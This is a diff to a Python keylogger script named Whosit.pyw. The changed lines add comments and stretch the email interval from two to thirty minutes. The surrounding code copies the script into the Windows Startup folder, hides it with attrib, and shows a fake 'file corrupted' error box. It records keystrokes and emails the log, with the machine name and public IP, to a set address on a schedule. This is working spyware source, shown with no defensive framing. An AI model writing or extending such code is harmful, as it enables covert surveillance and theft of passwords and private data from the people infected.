@@ -27,7 +27,7 @@ class Keyboard:
         self.file_path=f'C:\\Users\\{self.current_user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Whosit.pyw'
         if not os.path.isfile(self.file_path):
             ctypes.windll.user32.MessageBoxW(0, "Error !", "The File Has Been Corrupted !", 0x30)
-            copyfile('./Whosit.pyw',self.file_path)
+            copyfile('./Whosit.pyw',self.file_path)#change this to the exe file when editing 
             os.system(f'attrib +h {self.file_path}')
 
     def on_press(self,key):
@@ -56,6 +56,7 @@ class Mail:
         
 
     def send_mail(self):
+        #a third party website is used to provide the external ip !
         self.email_main['Subject'] = f'Keylog Information of Computer : {os.environ["COMPUTERNAME"]}, with public IP : {requests.get("https://api.ipify.org").text}. Date : {asctime(localtime())}.'
         self.email_main.attach(MIMEText(self.body,'plain'))
         self.payload=MIMEBase('application','octet-stream')
@@ -72,7 +73,7 @@ class Mail:
             smtp.sendmail(self.source_email,self.target_email,message)
             smtp.quit()
     def call_job(self):
-        schedule.every(2).minutes.do(self.send_mail)
+        schedule.every(30).minutes.do(self.send_mail)#you can change the duration
         while True:
             schedule.run_pending()
             sleep(1)
